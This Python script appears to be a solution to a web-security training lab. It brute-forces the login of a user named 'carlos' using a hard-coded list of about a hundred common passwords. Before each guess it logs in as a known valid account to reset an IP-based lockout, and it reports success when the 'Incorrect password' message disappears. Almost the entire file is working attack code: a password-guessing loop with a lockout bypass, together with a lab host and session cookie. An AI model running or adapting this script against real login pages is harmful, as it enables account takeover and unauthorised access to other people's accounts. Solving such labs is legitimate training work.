import requests
from requests_toolbelt.utils import dump
import sys
import os

passwords = [
    '123456',
    'password',
    '12345678',
    'qwerty',
    '123456789',
    '12345',
    '1234',
    '111111',
    '1234567',
    'dragon',
    '123123',
    'baseball',
    'abc123',
    'football',
    'monkey',
    'letmein',
    'shadow',
    'master',
    '666666',
    'qwertyuiop',
    '123321',
    'mustang',
    '1234567890',
    'michael',
    '654321',
    'superman',
    '1qaz2wsx',
    '7777777',
    '121212',
    '000000',
    'qazwsx',
    '123qwe',
    'killer',
    'trustno1',
    'jordan',
    'jennifer',
    'zxcvbnm',
    'asdfgh',
    'hunter',
    'buster',
    'soccer',
    'harley',
    'batman',
    'andrew',
    'tigger',
    'sunshine',
    'iloveyou',
    '2000',
    'charlie',
    'robert',
    'thomas',
    'hockey',
    'ranger',
    'daniel',
    'starwars',
    'klaster',
    '112233',
    'george',
    'computer',
    'michelle',
    'jessica',
    'pepper',
    '1111',
    'zxcvbn',
    '555555',
    '11111111',
    '131313',
    'freedom',
    '777777',
    'pass',
    'maggie',
    '159753',
    'aaaaaa',
    'ginger',
    'princess',
    'joshua',
    'cheese',
    'amanda',
    'summer',
    'love',
    'ashley',
    'nicole',
    'chelsea',
    'biteme',
    'matthew',
    'access',
    'yankees',
    '987654321',
    'dallas',
    'austin',
    'thunder',
    'taylor',
    'matrix',
    'mobilemail',
    'mom',
    'monitor',
    'monitoring',
    'montana',
    'moon',
    'moscow'
]


url = '0a8e00d604c240d78185127b009300a7.web-security-academy.net'
session_key = 'qPuGAwparF1U3RtWBnWc1W2SAZTkmIXW'
# not sure if this is correct approach but it worked
path= '/login'

HEADERS = {'Host': url,
            'Cookie':'session='+session_key+'; verify=carlos',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': url+path,
            'Origin': url,
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin'} 


def logging_hook(response, *args, **kwargs):
    data = dump.dump_all(response)
    print(data.decode('utf-8'))

http = requests.Session()
# http.hooks["response"] = [logging_hook]


i = 0
for i in range(2*len(passwords)):
    if i%2 == 0:
        r = http.post('https://'+url+path,headers=HEADERS, data='username=wiener&password=peter', allow_redirects=False)
    else:
        r = http.post('https://'+url+path,headers=HEADERS, data=f'username=carlos&password={passwords[int(i/2)]}', allow_redirects=False)
    sys.stdout.write('\r'+'trying password: '+passwords[int(i/2)])
    sys.stdout.flush()
    if i%2 == 1 and 'Incorrect password' not in dump.dump_all(r).decode('utf-8'):
        print(f'\npassword for carlos is: {passwords[int(i/2)]}')
        break